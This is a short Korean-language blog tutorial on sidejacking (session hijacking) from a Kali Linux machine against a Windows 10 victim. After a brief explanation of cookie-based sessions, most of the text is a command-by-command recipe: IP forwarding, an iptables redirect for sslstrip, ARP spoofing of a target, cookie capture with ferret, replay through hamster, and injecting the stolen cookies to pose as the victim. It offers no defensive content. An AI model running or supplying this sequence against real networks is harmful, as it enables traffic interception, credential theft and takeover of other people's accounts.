#  Side Jacking



01 / 10 , 2019  Jinyan 김상민



Side Jacking 에 대해 이야기해 보려고 합니다.



> 공격자 : Kali Linux
>
> 피해자 : Windows 10



Side Jacking



은 세션하이재킹으로도 지칭할 수 있는데, HTTP 연결의 트래픽(서버의 데이터)을 가로채 쿠키를 탈취하여 사용자(피해자)인척 인증하는 과정 및 해킹을 의미합니다. 

HTTP는 무상태 프로토콜이므로 Web에서는 모든 페이지에서 사용자 이름과 패스워드 없이 세션을 유지하는 방법이 필요한데, 처음 인증 후에는 전체 세션에 대응하는 쿠키를 발급하여 인증 수단으로 사용합니다. 이런 쿠키를 탈취하게 되면 해당 사용자(피해자)인척 페이지를 돌아다닐 수 있게 됩니다.



> 공격자 시점 : Kali Linux (터미널)



첫번째. IP 포워딩을 해줍니다. (외부에서 ipv4에 들어오는 요청건에 대해서는 무조건 패스)

```
echo "1"> /proc/sys/net/ipv4/ip_forward
```



두번째. SSLstrip 공격을 하기위해 IP Table을 수정해줍니다.

```
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1000
```



세번째. SSLstrip 공격을 합니다.

```
sslstrip -f -a -k -l 1000 -w /root/out.txt &
```



네번째. ARP 스푸핑을 공격을 해줍니다. (피해자의 통신을 확보하기 위해서)

```
arpspoof -i eth0 -t 192.xxx.x.xx(interface ip) 192.xxx.xxx.x.x(target ip) 
```



다섯번째. ferret tool을 실행해줍니다. (피해자의 통신의 쿠기를 탈취)

```
ferret i -eth0
```



여섯번째. hamster tool을 실행해줍니다. (Side Jacking의 도구로 프록시 서버를 이용)

```
hamster
```



설정은 끝났습니다. 이후에 피해자가 여러 웹사이트를 방문하면 hamster.txt파일이 업데이트 되는데 파일안 쿠키 를 이용하여 웹 개발자에 주입하면 피해자가 사용하고 있는 웹사이트를 이용할 수 있게 됩니다.